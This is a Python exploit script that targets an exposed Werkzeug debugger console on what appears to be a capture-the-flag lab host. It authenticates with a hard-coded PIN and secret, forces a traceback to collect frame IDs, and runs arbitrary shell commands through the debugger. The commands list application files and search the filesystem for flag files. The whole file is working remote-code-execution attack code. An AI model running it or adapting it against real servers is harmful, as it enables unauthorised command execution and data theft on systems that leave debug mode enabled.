"""Execute commands via Werkzeug debugger console (with correct URL)."""
import requests
import re
from urllib.parse import quote

T = "http://10.82.191.7"
SECRET = "sM6NrAKPszppdtL95Nl2"
PIN = "110-688-511"

# Step 1: Authenticate PIN (already done, but set cookie)
session = requests.Session()
auth_url = f"{T}?__debugger__=yes&cmd=pinauth&pin={PIN}&s={SECRET}"
r = session.get(auth_url, timeout=10)
print(f"[1] Auth: {r.text}")

# Step 2: Trigger an error to get a traceback with frame IDs
print("\n[2] Triggering error for traceback...")
err_url = f"{T}/download?server=INVALID&id=1"
r = session.get(err_url, timeout=10)

# Extract frame IDs from the traceback page
frame_ids = re.findall(r'__debugger__.*?frm=(\d+)', r.text)
print(f"  Frame IDs found: {frame_ids}")

# Also extract traceback ID
tb_ids = re.findall(r'tb=(\d+)', r.text)
print(f"  Traceback IDs: {tb_ids}")

# The console needs the correct frame ID - use the last one (application code)
# Also look for the "console" link pattern
console_links = re.findall(r'href="([^"]*__debugger__[^"]*)"', r.text)
print(f"  Console links: {console_links[:5]}")

# Step 3: Execute commands using the error page URL + debugger params
print("\n[3] Executing commands...")

# Use the download error URL as base
cmds = [
    "print('HELLO_TEST')",
    "import os; print(os.listdir('/usr/src/app'))",
    "import os; print(__import__('os').popen('find / -name *.txt -type f 2>/dev/null').read())",
    "import os; print(__import__('os').popen('find / -name flag* -type f 2>/dev/null').read())",
    "import os; print(__import__('os').popen('ls -la /usr/src/app/').read())",
]

# Try different frame IDs
frames_to_try = list(set(frame_ids)) if frame_ids else ["0"]

for frm in frames_to_try[:3]:
    print(f"\n--- Using frame {frm} ---")
    for cmd in cmds:
        exec_url = f"{T}/download?__debugger__=yes&cmd={quote(cmd)}&frm={frm}&s={SECRET}"
        r = session.get(exec_url, timeout=15)
        
        # The response from __debugger__ console is typically HTML with console output
        # Try to parse the actual output
        # Look for the output between >>> markers
        text = r.text
        
        # Method 1: Look for console output spans
        output = re.findall(r'<span class="string">&#39;(.*?)&#39;</span>', text)
        
        # Method 2: Look for text between <span> tags
        if not output:
            output = re.findall(r'class="[^"]*">(.*?)</span>', text)
        
        # Method 3: Strip all HTML
        clean = re.sub(r'<[^>]+>', '', text).strip()
        
        # Check if we got actual console output or an error page
        if "HELLO_TEST" in clean or "/usr/src" in clean or "flag" in clean.lower():
            print(f"  >>> {cmd}")
            print(f"  {clean[:500]}")
            break
        elif len(text) < 200:
            print(f"  >>> {cmd}")
            print(f"  Response: {text}")
        else:
            # Might be the error page again - check Content-Type
            ct = r.headers.get("Content-Type", "")
            print(f"  >>> {cmd}")
            print(f"  [{ct}] ({len(text)} bytes) - first 100: {clean[:100]}")
    
    # If first frame worked, stop
    if "HELLO_TEST" in clean or "/usr/src" in clean:
        break

# Step 4: Also try the /console endpoint
print("\n\n[4] Trying /console endpoint...")
for endpoint in ["/console", "/?__debugger__=yes"]:
    r = session.get(f"{T}{endpoint}", timeout=8)
    print(f"  {endpoint}: {r.status_code} ({len(r.text)}b)")
    if "console" in r.text.lower() and len(r.text) < 5000:
        print(f"  Content: {r.text[:300]}")
